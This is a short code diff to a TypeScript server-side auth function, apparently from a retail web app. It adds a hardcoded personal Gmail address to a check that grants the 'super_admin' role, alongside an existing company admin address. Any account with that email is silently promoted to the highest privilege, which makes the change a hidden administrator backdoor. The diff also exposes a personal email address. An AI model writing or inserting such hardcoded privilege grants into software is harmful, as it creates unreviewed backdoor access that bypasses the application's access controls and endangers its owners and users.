@@ -19,7 +19,7 @@ export async function getServerUser(): Promise<ServerUser | null> {
     if (!decoded || !decoded.userId || !decoded.role) return null;
 
     let actualRole = decoded.role;
-    if (decoded.email === "admin@retailmind.com") {
+    if (decoded.email === "admin@retailmind.com" || decoded.email === "ahmednajahi2003@gmail.com") {
       actualRole = "super_admin";
     }
 
